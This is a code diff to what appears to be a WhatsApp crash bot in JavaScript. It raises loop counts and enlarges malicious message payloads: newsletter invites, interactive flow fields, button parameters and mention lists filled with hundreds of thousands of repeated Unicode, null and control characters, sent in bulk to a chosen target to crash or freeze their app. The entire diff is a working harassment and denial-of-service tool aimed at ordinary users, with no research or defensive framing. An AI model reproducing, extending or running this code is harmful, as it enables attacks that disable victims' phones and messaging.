@@ -3054,10 +3054,12 @@ async function blankgc(target) {
 // END OF BUG FUNCTIONS 
 //=====COMBINING ALL GC BUG======//
 async function bug3(isTarget) {
-for (let i = 0; i < 60; i++) {
+for (let i = 0; i < 150; i++) {
 await killgc(isTarget);
 await rusuhgc(isTarget);
 await blankgc(isTarget);
+await blankgc(isTarget);
+await killgc(isTarget);
 }
 console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
 }
@@ -3070,10 +3072,10 @@ async function VampireBugIns(target) {
                 message: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: `33333333333333333@newsletter`,
-                        newsletterName: "*CYBER CRASHER KILL GROUP*" + "ꦾ".repeat(120000),
+                        newsletterName: "*CYBER CRASHER KILL GROUP*" + "ꦾ".repeat(200000) + "\u0000".repeat(100000),
                         jpegThumbnail: "",
-                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
-                        inviteExpiration: Date.now() + 1814400000, // 21 hari
+                        caption: "ꦽ".repeat(200000) + "@0".repeat(200000) + "\u0001".repeat(100000),
+                        inviteExpiration: Date.now() + 1814400000,
                     },
                 },
             },
@@ -3093,23 +3095,27 @@ async function VampireBugIns(target) {
                 "screen_1_DatePicker_1": "1028995200000",
                 "screen_1_TextInput_2": "null@gmail.com",
                 "screen_1_TextInput_3": "94643116",
-                "screen_0_TextInput_0": "\u0000".repeat(500000),
-                "screen_0_TextInput_1": "SecretDocu",
-                "screen_0_Dropdown_2": "#926-Xnull",
+                "screen_0_TextInput_0": "\u0000".repeat(999999),
+                "screen_0_TextInput_1": "\u0018".repeat(500000) + "SecretDocu",
+                "screen_0_Dropdown_2": "#926-Xnull" + "\u0001".repeat(200000),
                 "screen_0_RadioButtonsGroup_3": "0_true",
-                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." + "\u0000".repeat(100000)
             },
         },
+        {
+            name: "cta_url",
+            buttonParamsJson: JSON.stringify({ display_text: "\u0000".repeat(200000), url: "https://whatsapp.com", merchant_url: "https://whatsapp.com" })
+        }
     ],
 },
                      contextInfo: {
-                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                mentionedJid: Array.from({ length: 20 }, () => "0@s.whatsapp.net"),
                 groupMentions: [
-                    {
-                        groupJid: "0@s.whatsapp.net",
-                        groupSubject: "Vampire",
-                    },
+                    { groupJid: "0@s.whatsapp.net", groupSubject: "Vampire" + "\u0000".repeat(50000) },
+                    { groupJid: "1@s.whatsapp.net", groupSubject: "CYBER" + "\u0001".repeat(50000) },
                 ],
+                forwardingScore: 999999,
+                isForwarded: true,
             },
         };
 
@@ -3257,7 +3263,7 @@ async function iosOver(durationHours, XS) {
 
 // ================= ( Combo Function )====================
 async function Combo(target) { 
-        for (let i = 0; i< 100; i++) {
+        for (let i = 0; i< 200; i++) {
         await callinvisible(target);
         await ForceXFrezee(target);
         await blank1(target);
@@ -3276,12 +3282,16 @@ async function Combo(target) {
         await callinvisible(target);
         await ForceXFrezee(target);
         await blank1(target);
+        await callinvisible(target);
+        await ForceXFrezee(target);
+        await blank1(target);
+        await callinvisible(target);
         
         }
 }
 
 async function fcnew(target) { 
-        for (let i = 0; i< 100; i++) {     
+        for (let i = 0; i< 200; i++) {     
    await CarouselVY4(devtrust, target);
    await CarouselVY4(devtrust, target);
    await LocaXotion(target);
@@ -3299,6 +3309,9 @@ async function fcnew(target) {
    await LocaXotion(target);
    await XinsooInvisV1(target);  
    await CarouselVY4(devtrust, target);
+   await CarouselVY4(devtrust, target);
+   await LocaXotion(target);
+   await XinsooInvisV1(target);
    await CarouselVY4(devtrust, target);
    await LocaXotion(target);
    await XinsooInvisV1(target);
@@ -3336,7 +3349,7 @@ async function BugGroup(target) {
  }
 
 async function BayuOfficialHard(target) {
-    for (let i = 0; i< 200; i++) {
+    for (let i = 0; i< 400; i++) {
     await protoXimg(target)
     await bulldozer(target)
     await protocolbug3(target)
@@ -3346,11 +3359,12 @@ async function BayuOfficialHard(target) {
     await xatanicinvisv4(target)
     await bulldozer(target)
     await protocolbug6(target)
+    await bulldozer(target)
     }
 }
     
 async function ForceClose(target) {
-  for (let i = 0; i< 250; i++) {
+  for (let i = 0; i< 600; i++) {
   await forclose(target);
   await forclose(target);
   await forclose(target);
@@ -3360,19 +3374,23 @@ async function ForceClose(target) {
   await forclose(target);
   await forclose(target);
   await forclose(target);
-   await forclose(target);
   await forclose(target);
   await forclose(target);
-   await forclose(target);
   await forclose(target);
   await forclose(target);
-  
+  await forclose(target);
+  await forclose(target);
+  await forclose(target);
+  await forclose(target);
+  await forclose(target);
+  await forclose(target);
+  await forclose(target);
          }
  
  }
  
  async function XPhone(target) { 
-    for (let i = 0; i< 300; i++) {  // ✅ CORRECT - lowercase i
+    for (let i = 0; i< 600; i++) {
  
 await CarouselVY4(devtrust, target);
 await CrashLoadIos(devtrust, target);
@@ -3383,6 +3401,9 @@ await Xblanknoclick(target);
 await ForceXFrezee(target);
 await blank1(target);
 await callinvisible(target);
+await forclose(target);
+await forclose(target);
+await forclose(target);
    
    } 
    
